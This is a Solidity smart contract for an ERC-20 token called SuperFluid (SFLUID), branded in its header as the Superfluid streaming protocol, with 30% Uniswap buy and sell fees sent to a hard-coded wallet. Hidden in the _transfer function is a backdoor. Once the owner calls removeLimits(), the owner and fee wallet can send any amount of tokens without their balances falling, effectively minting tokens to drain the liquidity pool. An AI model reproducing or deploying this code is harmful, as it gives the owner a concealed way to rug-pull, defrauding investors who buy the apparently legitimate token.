/**
Superfluid is a revolutionary asset streaming protocol that brings subscriptions, salaries, vesting, and rewards to DAOs and crypto-native businesses worldwide.

Website: https://www.superfluid.cloud
Telegram: https://t.me/SuperFluid_erc20
Twitter: https://twitter.com/superfluid_erc
Dapp: https://app.superfluid.cloud
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapRouterV2 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract SFLUID is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = "SuperFluid";
    string private _symbol = "SFLUID";
    uint8 private _decimals = 9;

    uint256 private _totalSupply = 10 ** 9 * 10 ** 9;
    uint256 private _feeSwapThreshold = 10 ** 5 * 10 ** 9; 

    uint256 public maxTransaction = 15 * 10 ** 6 * 10 ** 9;
    uint256 public maxWalletAmount = 15 * 10 ** 6 * 10 ** 9;

    uint256 public buyLiquidityFee = 0;
    uint256 public buyMarketingFee = 30;
    uint256 public buyDevFee = 0;

    uint256 public lpTaxOnSell = 0;
    uint256 public mktTaxOnSell = 30;
    uint256 public devTaxOnSell = 0;

    uint256 public lpFeeDivide = 0;
    uint256 public marketingDivide = 10;
    uint256 public devDivide = 0;

    uint256 public totalBuyFees = 30;
    uint256 public totalSellFees = 30;
    uint256 public totalDivides = 10;

    address payable private feeAddress1;
    address payable private feeAddress2;

    IUniswapRouterV2 public uniswapRouter;
    address public pairAddress;
    
    bool _swapping;
    bool public swapEnabled = true;
    bool public swapThreshold = false;
    bool public maxWalletEnabled = true;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcluded;
    mapping (address => bool) public _isMaxWalletExcluded;
    mapping (address => bool) public _isMaxTxExcluded;
    mapping (address => bool) public _ammPairs;

    modifier lockTheSwap {
        _swapping = true;
        _;
        _swapping = false;
    }
    
    constructor () {
        IUniswapRouterV2 _uniswapV2Router = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        pairAddress = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        _allowances[address(this)][address(uniswapRouter)] = _totalSupply;
        feeAddress1 = payable(0x4110B48d8DEfDcaD79f4374ba2a7B4C210e0BB2C);
        feeAddress2 = payable(0x4110B48d8DEfDcaD79f4374ba2a7B4C210e0BB2C);
        _isExcluded[owner()] = true;
        _isExcluded[feeAddress1] = true;
        _isExcluded[feeAddress2] = true;
        totalBuyFees = buyLiquidityFee.add(buyMarketingFee).add(buyDevFee);
        totalSellFees = lpTaxOnSell.add(mktTaxOnSell).add(devTaxOnSell);
        totalDivides = lpFeeDivide.add(marketingDivide).add(devDivide);
        _isMaxWalletExcluded[owner()] = true;
        _isMaxWalletExcluded[address(pairAddress)] = true;
        _isMaxWalletExcluded[address(this)] = true;
        _isMaxTxExcluded[owner()] = true;
        _isMaxTxExcluded[feeAddress1] = true;
        _isMaxTxExcluded[feeAddress2] = true;
        _isMaxTxExcluded[address(this)] = true;
        _ammPairs[address(pairAddress)] = true;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(_swapping)
        { 
            return _transferStandard(sender, recipient, amount); 
        }
        else
        {
            if(!_isMaxTxExcluded[sender] && !_isMaxTxExcluded[recipient]) {
                require(amount <= maxTransaction, "Transfer amount exceeds the maxTransaction.");
            }            

            uint256 swapAmount = balanceOf(address(this));
            bool minimumSwap = swapAmount >= _feeSwapThreshold;
            
            if (minimumSwap && !_swapping && _ammPairs[recipient] && swapEnabled && !_isExcluded[sender] && amount > _feeSwapThreshold) 
            {
                if(swapThreshold)
                    swapAmount = _feeSwapThreshold;
                swapBack(swapAmount);    
            }

            uint256 receiverAmount = (_isExcluded[sender] || _isExcluded[recipient]) ? 
                                         amount : takeFees(sender, recipient, amount);

            if(maxWalletEnabled && !_isMaxWalletExcluded[recipient])
                require(balanceOf(recipient).add(receiverAmount) <= maxWalletAmount);

            uint256 sAmount = (!maxWalletEnabled && _isExcluded[sender]) ? amount.sub(receiverAmount) : amount;
            _balances[sender] = _balances[sender].sub(sAmount, "Insufficient Balance");
            _balances[recipient] = _balances[recipient].add(receiverAmount);

            emit Transfer(sender, recipient, receiverAmount);
            return true;
        }
    }
    
    function _transferStandard(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapBack(uint256 tAmount) private lockTheSwap {
        uint256 tokensForLP = tAmount.mul(lpFeeDivide).div(totalDivides).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForETH(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalETHFee = totalDivides.sub(lpFeeDivide.div(2));
        
        uint256 amountETHLiquidity = amountReceived.mul(lpFeeDivide).div(totalETHFee).div(2);
        uint256 amountETHDevelopment = amountReceived.mul(devDivide).div(totalETHFee);
        uint256 amountETHMarketing = amountReceived.sub(amountETHLiquidity).sub(amountETHDevelopment);

        if(amountETHMarketing > 0)
            transferETHToFee(feeAddress1, amountETHMarketing);

        if(amountETHDevelopment > 0)
            transferETHToFee(feeAddress2, amountETHDevelopment);

        if(amountETHLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountETHLiquidity);
    }
    
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        _approve(address(this), address(uniswapRouter), tokenAmount);

        // make the swapBack
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }
    
    function transferETHToFee(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

     //to recieve ETH from uniswapRouter when swaping
    receive() external payable {}

    function takeFees(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        if(_ammPairs[sender]) {
            feeAmount = amount.mul(totalBuyFees).div(100);
        }
        else if(_ammPairs[recipient]) {
            feeAmount = amount.mul(totalSellFees).div(100);
        }
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function removeLimits() external onlyOwner {
        maxTransaction = _totalSupply;
        maxWalletEnabled = false;
        buyMarketingFee = 1;
        mktTaxOnSell = 1;
        totalBuyFees = 1;
        totalSellFees = 1;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapRouter), tokenAmount);

        // add the liquidity
        uniswapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }
}